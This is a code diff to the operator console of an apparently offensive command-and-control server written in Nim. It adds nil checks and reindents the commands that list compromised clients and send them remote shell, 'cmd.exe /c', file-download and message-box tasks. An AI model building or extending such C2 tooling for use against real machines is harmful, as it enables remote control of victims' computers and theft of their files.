@@ -122,58 +122,72 @@ proc procStdin*(server: C2Server) {.async.} =
 
             of "clients":
                 for client in server.clients:
-                    if client.connected:
-                        stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
-                    else:
-                        stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
+                  if client.connected:
+                    stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
+                  else:
+                    stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
                 infoLog $len(server.clients) & " clients currently connected"
             of "info":
-                echo @handlingClient
+              if handlingClient.isNil():
+                errorLog "you need to interact with a client to use this command"
+                continue
+              echo @handlingClient
 
             # tasks management
 
             of "tasks":
-                for task in server.tasks:
-                    echo $task.client & " <= " & $task
+              for task in server.tasks:
+                echo $task.client & " <= " & $task
 
             # navigation
             
             of "interact":
-                for client in server.clients:
-                    if client.id == parseInt(args[1]):
-                        handlingClient = client
-                if handlingClient.isNil() or handlingClient.id != parseInt(args[1]):
-                    infoLog "client not found"
+              for client in server.clients:
+                if client.id == parseInt(args[1]):
+                  handlingClient = client
+              if handlingClient.isNil() or handlingClient.id != parseInt(args[1]):
+                infoLog "client not found"
             of "back": 
-                handlingClient = nil
+              handlingClient = nil
             of "exit":
-                for tcpListener in server.tcpListeners:
-                    tcpListener.running = false
-                    tcpListener.socket.close()
+              for tcpListener in server.tcpListeners:
+                tcpListener.running = false
+                tcpListener.socket.close()
+              quit(0)
 
             # client commands
 
             of "download":
-                let task = await download.sendTask(handlingClient, args[1])
-                await task.awaitResponse()
+              if handlingClient.isNil():
+                errorLog "you need to interact with a client to use this command"
+                continue
+              let task = await download.sendTask(handlingClient, args[1])
+              await task.awaitResponse()
             of "shell":
-                if argsn == 1:
-                    infoLog "type 'back' to exit shell mode"
-                    cmdMode = true
-                else:
-                    let task = await shell.sendTask(handlingClient, a_args)
-                    await task.awaitResponse()
+              if handlingClient.isNil():
+                errorLog "you need to interact with a client to use this command"
+                continue
+              if argsn == 1:
+                infoLog "type 'back' to exit shell mode"
+                cmdMode = true
+                continue
+              let task = await shell.sendTask(handlingClient, a_args)
+              await task.awaitResponse()
             of "cmd":
-                let task = await shell.sendTask(handlingClient, "cmd.exe /c " & a_args)
-                await task.awaitResponse()
+              if handlingClient.isNil():
+                errorLog "you need to interact with a client to use this command"
+                continue
+              let task = await shell.sendTask(handlingClient, "cmd.exe /c " & a_args)
+              await task.awaitResponse()
             of "msgbox":
-                if argsn >= 3:
-                    let slashSplit = a_args.split("/")
-                    discard await msgbox.sendTask(handlingClient, slashSplit[1].strip(), slashSplit[0].strip())
-                else:
-                    echo "wrong usage. msgbox (title) / (caption)"
-
-                # quit(0)
+              if handlingClient.isNil():
+                errorLog "you need to interact with a client to use this command"
+                continue
+              if argsn >= 3:
+                let slashSplit = a_args.split("/")
+                discard await msgbox.sendTask(handlingClient, slashSplit[1].strip(), slashSplit[0].strip())
+              else:
+                echo "wrong usage. msgbox (title) / (caption)"
 
       prompt(handlingClient, cmdMode, server)
       messageFlowVar = spawn stdin.readLine()
